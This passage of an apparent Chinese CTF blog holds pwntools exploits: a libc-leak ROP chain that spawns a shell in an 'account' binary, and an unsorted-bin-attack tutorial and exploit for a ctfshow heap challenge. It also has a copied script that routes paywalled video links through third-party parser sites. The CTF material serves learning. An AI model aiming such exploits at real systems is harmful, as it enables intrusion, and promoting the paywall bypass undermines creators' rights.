保持32位有符号整数特性</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算delta_v4，用于还原v4的上一步值</span></span><br><span class="line">            term1 = v5</span><br><span class="line">            term2 = (current_v3 + v5) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            term3 = (<span class="number">16</span> * current_v3 + a2[<span class="number">2</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            term4 = ((current_v3 &gt;&gt; <span class="number">5</span>) + a2[<span class="number">3</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            delta_v4 = (term1 ^ term2 ^ term3 ^ term4) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 还原上一步的v4</span></span><br><span class="line">            prev_v4 = (current_v4 - delta_v4) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算delta_v3，用于还原v3的上一步值</span></span><br><span class="line">            term1_v3 = v5</span><br><span class="line">            term2_v3 = (prev_v4 + v5) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            term3_v3 = (<span class="number">16</span> * prev_v4 + a2[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            term4_v3 = ((prev_v4 &gt;&gt; <span class="number">5</span>) + a2[<span class="number">1</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            delta_v3 = (term1_v3 ^ term2_v3 ^ term3_v3 ^ term4_v3) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 还原上一步的v3</span></span><br><span class="line">            prev_v3 = (current_v3 - delta_v3) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 更新当前值，准备下一步逆向</span></span><br><span class="line">            current_v3, current_v4 = prev_v3, prev_v4</span><br><span class="line"></span><br><span class="line">        initial_pairs.append((current_v3, current_v4))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将初始值转换为字节（小端序，符合x86架构）</span></span><br><span class="line">    flag_bytes = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> v3, v4 <span class="keyword">in</span> initial_pairs:</span><br><span class="line">        flag_bytes += v3.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        flag_bytes += v4.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flag_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取并打印flag</span></span><br><span class="line">flag = reverse_encrypt()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag: b3d06a66f8aa86e3e6390f615e389e55</span><br></pre></td></tr></table></figure>



<h2 id="account"><a href="#account" class="headerlink" title="account"></a>account</h2><p>注意一下到了v12要将其覆盖成13就可以了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义自定义函数以匹配图片中的代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">s</span>): <span class="keyword">return</span> p.recvuntil(s)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">s</span>): <span class="keyword">return</span> p.sendline(s)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> p.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rn</span>(<span class="params">n</span>): <span class="keyword">return</span> p.recvn(n)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ia</span>(): <span class="keyword">return</span> p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理32位地址的符号问题（与图片完全一致）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stre</span>(<span class="params">val</span>): </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(val &amp; <span class="number">0xffffffff</span>).encode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动进程</span></span><br><span class="line">p = process(<span class="string">&#x27;./account&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./account&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一阶段：泄露libc地址（与图片完全一致）</span></span><br><span class="line">ru(<span class="string">b&quot;Enter your bill, enter 0 to exit:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    sl(<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;13&#x27;</span>)</span><br><span class="line">sl(stre(<span class="number">0x080490B0</span>))   <span class="comment"># puts@plt</span></span><br><span class="line">sl(stre(elf.sym[<span class="string">&#x27;vul&#x27;</span>]))    <span class="comment"># vul函数地址</span></span><br><span class="line">sl(stre(<span class="number">0x0804C014</span>))   <span class="comment"># puts@got</span></span><br><span class="line">sl(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl()  <span class="comment"># 接收&quot;Recording completed&quot;行</span></span><br><span class="line">libc_base = u32(rn(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二阶段：获取shell（与图片完全一致）</span></span><br><span class="line">ru(<span class="string">b&quot;Enter your bill, enter 0 to exit:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    sl(<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;13&#x27;</span>)</span><br><span class="line">sl(stre(system_addr - <span class="number">0x100000000</span>))  <span class="comment"># 负数技巧</span></span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)  <span class="comment"># 任意返回地址</span></span><br><span class="line">sl(stre(binsh_addr - <span class="number">0x100000000</span>))   <span class="comment"># 负数技巧</span></span><br><span class="line">sl(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ia()  <span class="comment"># 进入交互模式</span></span><br></pre></td></tr></table></figure>





<h3 id="多重Caesar密码"><a href="#多重Caesar密码" class="headerlink" title="多重Caesar密码"></a>多重Caesar密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myfz&#123;hrpa_pfxddi_ypgm_xxcqkwyj_dkzcvz_2025&#125;</span><br></pre></td></tr></table></figure>

<p>我当时写的时候</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myfz&#123;hrpa_pfxddi_ypgm_xxcqkwyj_dkzcvz_2025&#125;</span><br><span class="line">flag      caesar</span><br><span class="line"></span><br><span class="line">m y  f  z h r p a p  f x  d   d   i</span><br><span class="line">f l  a  g         c  a e  s   a   r</span><br><span class="line">7 13 5  19        13 5 19 -15 -3  -17</span><br></pre></td></tr></table></figure>

<p>我把’-‘算计去了，结果以为循环是 7 13 5 19 -15 -3 -17,没解出来了。</p>
<p>看有的师傅用ai深度研究梭哈了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;easy_caesar_with_multiple_shifts_2025&#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>wp</category>
      </categories>
  </entry>
  <entry>
    <title>unsorted bin attack</title>
    <url>/2025/07/18/unsorted-bin-attack/</url>
    <content><![CDATA[<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>原理学习:unsorted bin attack就是能把某个地址的值改成很大，但是这个很大的值又不可控。（这里的ctfshow的pwn144涉及到了这个手法，但是不完全，以后碰到在接着总结）</p>
<h3 id="pwn144"><a href="#pwn144" class="headerlink" title="pwn144"></a>pwn144</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">114514</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)magic &lt;= <span class="number">0x1BF52</span> ) <span class="comment">//修改magic大于0x1BF52即可达到后门函数</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">          TaT();   <span class="comment">//后门函数</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      create_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      edit_heap();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( heaparray[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    v2 = atoi(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input(heaparray[v1], v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>edit函数没检查修改的chunk的大小可以进行对下一个堆的覆盖。</p>
<p>攻击思路：</p>
<ol>
<li>先申请三个堆块，chunk0,chunk1,chunk2; chunk0用来改chunk1,chunk2用来隔开top_chunk</li>
<li>将chunk1的bk改成magic的地址-0x10(bk指向的是chunk的其实地址，我们要把magic的地址放入data的位置)</li>
<li>我们把chunk1放入unsorted bin，然后再申请一样大小的堆，就可以将magic改成一个很大的值。</li>
</ol>
<p>攻击原理：利用 <code>malloc</code> 从 Unsorted Bin 中取出一个 chunk（称为 <code>victim</code>）时，对 Unsorted Bin 双向链表进行的拆链操作。通过篡改 <code>victim-&gt;bk</code> 指针，欺骗分配器，让它错误地更新链表，从而将 <code>target</code> 地址误认为是链表中的一个合法 chunk 的起始位置（<code>chunk header</code>），并将 main_arena 中指向 Unsorted Bin 的指针写入这个“伪造 chunk”的 <code>fd</code> 字段。</p>
<p>这里附一个关键步骤详解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.准备 Victim Chunk 并放入 Unsorted Bin:</span><br><span class="line"></span><br><span class="line">申请一个稍大的 chunk（例如大于 fastbin 的最大值）。</span><br><span class="line"></span><br><span class="line">释放这个 chunk，使其进入 Unsorted Bin。</span><br><span class="line"></span><br><span class="line">重要前提： 在攻击发生的时刻，Unsorted Bin 中最好只有这一个 chunk（victim），或者有多个大小完全相同的 chunk（且攻击目标是其中之一）。这样 victim-&gt;fd 和 victim-&gt;bk 都会直接指向 main_arena 中管理 Unsorted Bin 的头部指针 bin-&gt;bk 和 bin-&gt;fd，而不是其他 chunk。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.篡改 Victim-&gt;bk:</span><br><span class="line"></span><br><span class="line">利用堆漏洞（如 UAF、堆溢出）修改 victim chunk 的 bk 指针。</span><br><span class="line"></span><br><span class="line">将 victim-&gt;bk 设置为 target - 0x10 (在 64 位系统上) 或 target - 0x8 (在 32 位系统上)。</span><br><span class="line"></span><br><span class="line">为什么是 target - 0x10 (64位)?</span><br><span class="line"></span><br><span class="line">Unsorted Bin 是一个管理 空闲 chunk 的双向链表。</span><br><span class="line"></span><br><span class="line">链表中每个节点的指针（fd 和 bk）指向的是 其他空闲 chunk 的 header 起始地址 (chunk header)。</span><br><span class="line"></span><br><span class="line">chunk header 在 64 位系统上通常是 0x10 字节（包含 size/prev_size 和 flags 字段）。</span><br><span class="line"></span><br><span class="line">我们希望 malloc 返回后，target 地址处被写入那个巨大的值（即 target 被当作用户数据区 mem 的起始地址）。</span><br><span class="line"></span><br><span class="line">为了让分配器认为 target 地址处有一个合法的 chunk，我们需要在 target - 0x10 处伪造一个 chunk header。这样：</span><br><span class="line"></span><br><span class="line">伪造 chunk 的 header 地址 = target - 0x10</span><br><span class="line"></span><br><span class="line">伪造 chunk 的用户数据区 (mem) 地址 = (target - 0x10) + 0x10 = target</span><br><span class="line"></span><br><span class="line">所以，我们将 victim-&gt;bk 设置为 target - 0x10，就是在告诉分配器：“Unsorted Bin 中，victim 的下一个空闲 chunk（后向 chunk）的 header 位于 target - 0x10”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.触发分配 (malloc) - 拆链操作:</span><br><span class="line"></span><br><span class="line">申请一个大小合适的 chunk（通常是和 victim 大小相同或满足 victim 分割条件的 size）。这会触发分配器从 Unsorted Bin 中取出 victim。</span><br><span class="line"></span><br><span class="line">分配器执行标准的双向链表移除操作 (拆链)：</span><br><span class="line"></span><br><span class="line">c</span><br><span class="line">// 伪代码表示关键的拆链步骤 (基于 glibc 源码简化)</span><br><span class="line">bck = victim-&gt;bk; // 步骤 (a)：bck = target - 0x10</span><br><span class="line">bin-&gt;bk = bck;    // 步骤 (a)：Unsorted Bin 的 bk 指针更新为 target - 0x10</span><br><span class="line">bck-&gt;fd = bin;    // 步骤 (b)：关键写入发生在这里！</span><br><span class="line">步骤 (a): bin-&gt;bk = victim-&gt;bk = target - 0x10</span><br><span class="line"></span><br><span class="line">分配器将 Unsorted Bin 的尾部指针 (bin-&gt;bk) 更新为 victim-&gt;bk 的值，也就是 target - 0x10。这意味着分配器现在认为 Unsorted Bin 中最后一个 chunk 的 header 在 target - 0x10。</span><br><span class="line"></span><br><span class="line">步骤 (b): bck-&gt;fd = bin</span><br><span class="line"></span><br><span class="line">bck 就是上一步得到的 target - 0x10。</span><br><span class="line"></span><br><span class="line">bck-&gt;fd 表示“位于 target - 0x10 的这个伪造 chunk”的 fd 指针。</span><br><span class="line"></span><br><span class="line">bin 是 main_arena 中管理 Unsorted Bin 的头部指针地址（它是一个很大的 libc 地址）。</span><br><span class="line"></span><br><span class="line">这是攻击的核心写入点！ 分配器将 bin (那个很大的 libc 地址) 写入到 (target - 0x10) + offset_of(fd) 的位置。</span><br><span class="line"></span><br><span class="line">在 chunk 结构中，fd 位于 header 起始地址偏移 0x10 字节处（紧跟在 size 字段之后）。</span><br><span class="line"></span><br><span class="line">写入地址 = (target - 0x10) + 0x10 = target。</span><br><span class="line"></span><br><span class="line">因此，巨大的值 bin (main_arena 地址) 被写入了 target 地址处。</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">count=<span class="number">1</span></span><br><span class="line">gdb_flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> count==<span class="number">0</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28127</span>)</span><br><span class="line"><span class="keyword">if</span> gdb_flag==<span class="number">1</span>:</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">x</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content of heap:&#x27;</span>)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,data</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))   </span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content of heap : &#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">target=<span class="number">0x6020a0</span></span><br><span class="line">payload=<span class="string">b&#x27;x&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(target-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">cmd(<span class="number">114514</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gdb.attach(r)</span><br><span class="line">pause <span class="comment">#可以加这个调试看看，这里就不演示了</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PWN</category>
        <category>总结</category>
        <category>heap</category>
      </categories>
  </entry>
  <entry>
    <title>vip视频免费观看py脚本</title>
    <url>/2025/01/23/vip%E8%A7%86%E9%A2%91%E5%85%8D%E8%B4%B9%E8%A7%82%E7%9C%8Bpy%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h1 id="今天白嫖了一个脚本不知道哪里有问题望大佬指点一下"><a href="#今天白嫖了一个脚本不知道哪里有问题望大佬指点一下" class="headerlink" title="今天白嫖了一个脚本不知道哪里有问题望大佬指点一下"></a>今天白嫖了一个脚本不知道哪里有问题望大佬指点一下</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># url解析</span><br><span class="line"></span><br><span class="line">from urllib import parse</span><br><span class="line">import tkinter.messagebox as msgbox</span><br><span class="line">import tkinter as tk</span><br><span class="line">import webbrowser</span><br><span class="line">import re</span><br><span class="line"># python  外包  外快  5   20</span><br><span class="line"></span><br><span class="line">class APP:</span><br><span class="line">    def __init__(self, width=500, height=300):</span><br><span class="line">        self.w = width</span><br><span class="line">        self.h = height</span><br><span class="line">        self.title = &#x27; VIP视频破解助手&#x27;</span><br><span class="line">        self.root = tk.Tk(className=self.title)</span><br><span class="line">        # 定义button控件上的文字</span><br><span class="line">        self.url = tk.StringVar()</span><br><span class="line"></span><br><span class="line">        # 定义选择哪个播放源</span><br><span class="line">        self.v = tk.IntVar()</span><br><span class="line"></span><br><span class="line">        # 默认为1</span><br><span class="line">        self.v.set(1)</span><br><span class="line"></span><br><span class="line">        # Frame空间</span><br><span class="line">        frame_1 = tk.Frame(self.root)</span><br><span class="line">        frame_2 = tk.Frame(self.root)</span><br><span class="line">        frame_3 = tk.Frame(self.root)</span><br><span class="line"></span><br><span class="line">        # Menu菜单</span><br><span class="line">        menu = tk.Menu(self.root)</span><br><span class="line">        self.root.config(menu=menu)</span><br><span class="line">        moviemenu = tk.Menu(menu, tearoff=0)</span><br><span class="line">        menu.add_cascade(label=&#x27;友情链接&#x27;, menu=moviemenu)</span><br><span class="line">        # 各个网站链接</span><br><span class="line">        moviemenu.add_command(label=&#x27;腾讯视频&#x27;, command=lambda: webbrowser.open(&#x27;http://v.qq.com/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;搜狐视频&#x27;, command=lambda: webbrowser.open(&#x27;http://tv.sohu.com/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;芒果TV&#x27;, command=lambda: webbrowser.open(&#x27;http://www.mgtv.com/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;爱奇艺&#x27;, command=lambda: webbrowser.open(&#x27;http://www.iqiyi.com/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;PPTV&#x27;, command=lambda: webbrowser.open(&#x27;http://www.bilibili.com/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;优酷&#x27;, command=lambda: webbrowser.open(&#x27;http://www.youku.com/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;乐视&#x27;, command=lambda: webbrowser.open(&#x27;http://www.le.com/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;土豆&#x27;, command=lambda: webbrowser.open(&#x27;http://www.tudou.com/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;A站&#x27;, command=lambda: webbrowser.open(&#x27;http://www.acfun.tv/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;B站&#x27;, command=lambda: webbrowser.open(&#x27;http://www.bilibili.com/&#x27;))</span><br><span class="line"></span><br><span class="line">        # 控件内容设置</span><br><span class="line">        group = tk.Label(frame_1, text=&#x27;请选择一个视频播放通道：&#x27;, padx=10, pady=10)</span><br><span class="line">        tb1 = tk.Radiobutton(frame_1, text=&#x27;通道一&#x27;, variable=self.v, value=1, width=10, height=3)</span><br><span class="line">        tb2 = tk.Radiobutton(frame_1, text=&#x27;通道二&#x27;, variable=self.v, value=2, width=10, height=3)</span><br><span class="line">        label1 = tk.Label(frame_2, text=&quot;请输入视频链接：&quot;)</span><br><span class="line">        entry = tk.Entry(frame_2, textvariable=self.url, highlightcolor=&#x27;Fuchsia&#x27;, highlightthickness=1, width=35)</span><br><span class="line">        label2 = tk.Label(frame_2, text=&quot; &quot;)</span><br><span class="line">        play = tk.Button(frame_2, text=&quot;播放&quot;, font=(&#x27;楷体&#x27;, 12), fg=&#x27;Purple&#x27;, width=2, height=1, command=self.video_play)</span><br><span class="line">        label3 = tk.Label(frame_2, text=&quot; &quot;)</span><br><span class="line">        label_explain = tk.Label(frame_3, fg=&#x27;red&#x27;, font=(&#x27;楷体&#x27;, 12),</span><br><span class="line">                                 text=&#x27;\n注意：支持大部分主流视频网站的视频播放！\n此软件仅用于交流学习，请勿用于任何商业用途！&#x27;)</span><br><span class="line">        label_warning = tk.Label(frame_3, fg=&#x27;blue&#x27;, font=(&#x27;楷体&#x27;, 12), text=&#x27;\n建议：将Chrome内核浏览器设置为默认浏览器&#x27;)</span><br><span class="line"></span><br><span class="line">        # 控件布局</span><br><span class="line">        frame_1.pack()</span><br><span class="line">        frame_2.pack()</span><br><span class="line">        frame_3.pack()</span><br><span class="line">        group.grid(row=0, column=0)</span><br><span class="line">        tb1.grid(row=0, column=1)</span><br><span class="line">        tb2.grid(row=0, column=2)</span><br><span class="line">        label1.grid(row=0, column=0)</span><br><span class="line">        entry.grid(row=0, column=1)</span><br><span class="line">        label2.grid(row=0, column=2)</span><br><span class="line">        play.grid(row=0, column=3, ipadx=10, ipady=10)</span><br><span class="line">        label3.grid(row=0, column=4)</span><br><span class="line">        label_explain.grid(row=1, column=0)</span><br><span class="line">        label_warning.grid(row=2, column=0)</span><br><span class="line"></span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    函数说明:视频播放</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def video_play(self):</span><br><span class="line">        # 视频解析网站地址</span><br><span class="line">        port_1 = &#x27;http://www.wmxz.wang/video.php?url=&#x27;</span><br><span class="line">        port_2 = &#x27;http://www.vipjiexi.com/tong.php?url=&#x27;</span><br><span class="line"></span><br><span class="line">        # 正则表达是判定是否为合法链接</span><br><span class="line">        if re.match(r&#x27;^https?:/&#123;2&#125;\w.+$&#x27;, self.url.get()):</span><br><span class="line">            if self.v.get() == 1:</span><br><span class="line">                # 视频链接获取</span><br><span class="line">                ip = self.url.get()</span><br><span class="line">                # 视频链接加密</span><br><span class="line">                ip = parse.quote_plus(ip)</span><br><span class="line">                # 浏览器打开</span><br><span class="line">                webbrowser.open(port_1 + self.url.get())</span><br><span class="line">            elif self.v.get() == 2:</span><br><span class="line">                # 链接获取</span><br><span class="line">                ip = self.url.get()</span><br><span class="line">                # 链接加密</span><br><span class="line">                ip = parse.quote_plus(ip)</span><br><span class="line"></span><br><span class="line">                # 获取time、key、url</span><br><span class="line">                get_url = &#x27;http://www.vipjiexi.com/x2/tong.php?url=%s&#x27; % ip</span><br><span class="line"></span><br><span class="line">                # 请求之后立刻打开</span><br><span class="line">                webbrowser.open(get_url)</span><br><span 